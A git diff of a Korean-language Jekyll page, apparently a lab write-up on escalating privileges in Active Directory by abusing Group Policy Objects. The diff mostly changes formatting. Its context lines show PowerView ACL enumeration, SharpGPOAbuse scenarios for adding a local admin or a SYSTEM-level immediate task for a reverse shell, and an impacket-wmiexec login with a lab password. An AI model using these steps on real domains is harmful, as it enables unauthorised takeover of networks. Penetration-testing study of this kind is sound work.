@@ -1,4 +1,14 @@
+---
+layout: page
+title: GPO
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 
 # GPO(그룹 정책 개체)를 이용한 권한 상승 가이드
@@ -18,7 +28,7 @@ GPO(Group Policy Object)는 Active Directory 내의 사용자 및 컴퓨터에 �
 #### **PowerView를 이용한 수동 열거**
 - `PowerView.ps1` 스크립트를 사용하여 특정 GPO의 권한을 수동으로 확인할 수 있습니다.
 
-```powershell title="PowerView로 GPO 권한 확인"
+```powershell
 # 특정 GPO의 ACL(Access Control List) 확인
 Get-ObjectAcl -ResolveGUIDs -Name "<GPO_Name>"
 ```
@@ -33,7 +43,7 @@ Get-ObjectAcl -ResolveGUIDs -Name "<GPO_Name>"
 #### **공격 시나리오 A: 로컬 관리자 추가 (은밀한 방식)**
 - **전략:** GPO를 수정하여 특정 사용자를 GPO가 적용되는 모든 컴퓨터의 로컬 관리자 그룹에 추가합니다. 이 방법은 즉시 셸을 획득하는 것은 아니지만, 탐지될 가능성이 낮습니다.
 
-```powershell(title="SharpGPOAbuse - 로컬 관리자 추가")
+```powershell
 # --AddLocalAdmin: 로컬 관리자 추가 모드
 # --UserAccount: 관리자로 추가할 사용자 계정
 # --GPOName: 공격 대상 GPO의 이름
@@ -43,7 +53,7 @@ Get-ObjectAcl -ResolveGUIDs -Name "<GPO_Name>"
 #### **공격 시나리오 B: 즉시 실행 작업 추가 (공격적인 방식)**
 - **전략:** GPO에 즉시 실행되는 예약 작업을 추가하여, 리버스 셸과 같은 악성 코드를 `SYSTEM` 권한으로 실행시킵니다.
 
-```powershell(title="SharpGPOAbuse - 즉시 실행 작업 추가")
+```powershell
 # --AddImmediateTask: 즉시 실행 예약 작업 추가 모드
 # --Command: 실행할 명령어
 # --TaskName: 작업 이름
@@ -62,7 +72,7 @@ gpupdate /force
 net user enterprise-security
 ```
 
-```bash title="공격자 Kali"
+```bash
 rlwrap impacket-wmiexec 'vulnnet.local/enterprise-security:sand_0873959498'@$target
 ```
 
